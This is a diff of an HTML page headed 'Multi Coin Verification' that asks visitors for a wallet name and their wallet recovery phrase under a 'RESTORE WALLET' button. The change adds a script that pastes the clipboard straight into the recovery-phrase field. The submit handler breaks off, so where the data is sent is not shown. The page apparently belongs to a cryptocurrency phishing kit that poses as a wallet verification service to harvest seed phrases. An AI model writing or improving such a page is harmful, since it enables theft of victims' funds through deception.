@@ -94,8 +94,7 @@ textarea {
 <body>
 
 <div class="container">
-  <h2>Multi Coin Verification</h2>
-  <p>Login to Continue</p>
+  <h2>Multi Coin Verification</h2><p>Login to Continue</p>
 
   <form id="form">
     <input type="text" id="username" placeholder="Wallet Name/Trust wallet/Exoduswallet" required>
@@ -104,8 +103,7 @@ textarea {
  <textarea id="complaint" placeholder="Enter recovery phrase" required" required></textarea>
  <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
 </div>
-
-   <button type="submit" class="submit-btn">RESTORE WALLET</button>
+<button type="submit" class="submit-btn">RESTORE WALLET</button>
   </form>
 
   <div class="footer">
@@ -114,6 +112,14 @@ textarea {
 </div>
 
 <script>
+async function pasteClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    document.getElementById("complaint").value = text;
+  } catch (err) {
+    alert("Clipboard access denied");
+  }
+}
 document.getElementById("form").addEventListener("submit", async (e) => {
   e.preventDefault();
 
